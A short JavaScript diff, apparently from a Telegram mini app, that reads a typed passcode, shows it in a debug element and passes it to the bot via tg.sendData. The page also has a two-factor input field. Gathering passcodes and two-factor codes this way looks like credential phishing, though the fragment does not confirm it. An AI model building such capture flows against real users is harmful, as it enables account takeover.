@@ -7,6 +7,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const page1 = document.getElementById('page1');
     const page2 = document.getElementById('page2');
     const blur = document.getElementById('blur');
+    const TEST = document.getElementById('TEST');
     const passcodeBtn = document.getElementById('passcode-btn');
     const passcodeInput = document.getElementById('hiddenInput');
     const twofactorInput = document.getElementById('twofactor-input');
@@ -51,7 +52,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
     passcodeBtn.addEventListener('click', () => {
         // page2.style.transform = 'translate(-50%, 40px)';
-        // page2.style.opacity = '0';
+        page2.style.opacity = '0';
+        TEST.textContent = passcodeInput.value;
         tg.sendData(passcodeInput.value);
 
         // setTimeout(() => {
